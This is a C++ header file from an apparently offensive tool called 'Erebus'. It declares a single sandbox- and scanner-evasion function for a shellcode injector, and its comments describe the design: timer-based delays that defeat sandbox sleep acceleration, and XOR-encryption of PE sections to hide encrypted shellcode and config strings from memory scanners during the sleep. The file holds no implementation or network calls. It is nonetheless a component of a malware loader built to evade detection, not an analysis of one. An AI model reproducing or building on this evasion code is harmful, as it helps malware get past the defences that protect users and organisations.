#ifndef EREBUS_SLEEP_OBFUSCATION_HPP
#define EREBUS_SLEEP_OBFUSCATION_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // Jittered pre-injection dwell.
    //
    // Behaviour is compile-time selected via CONFIG_SLEEP_OBFUSCATION_TYPE:
    //
    //   0 - disabled (no-op, zero overhead)
    //
    //   1 - WaitableTimer dwell
    //       Uses CreateWaitableTimerW + WaitForSingleObject instead of Sleep().
    //       Sandboxes commonly accelerate Sleep() / NtDelayExecution(); a kernel
    //       waitable timer fires at real wall-clock time and bypasses most such
    //       acceleration.  Total dwell = base_ms + random(0, jitter_ms).
    //
    //   2 - WaitableTimer + Ekko-lite section XOR
    //       Same timer approach, but additionally XOR-encrypts all non-.text PE
    //       sections (including .rdata where encrypted shellcode lives) during
    //       the dwell window.  Decrypts the sections on wake before returning.
    //       Hides static shellcode bytes and config strings from heap/memory
    //       scanners that run during the sleep interval.
    //
    // Args:
    //   base_ms   - Minimum dwell in milliseconds (CONFIG_SLEEP_OBFUSCATION_BASE_MS)
    //   jitter_ms - Maximum random addition to base (CONFIG_SLEEP_OBFUSCATION_JITTER_MS)
    //
    // Returns TRUE on success, FALSE if the timer could not be created
    // (fallback to NtDelayExecution is attempted on failure).
    BOOL ObfuscatedDwell(ULONG base_ms, ULONG jitter_ms);

} // namespace evasion
} // namespace erebus

#endif // EREBUS_SLEEP_OBFUSCATION_HPP
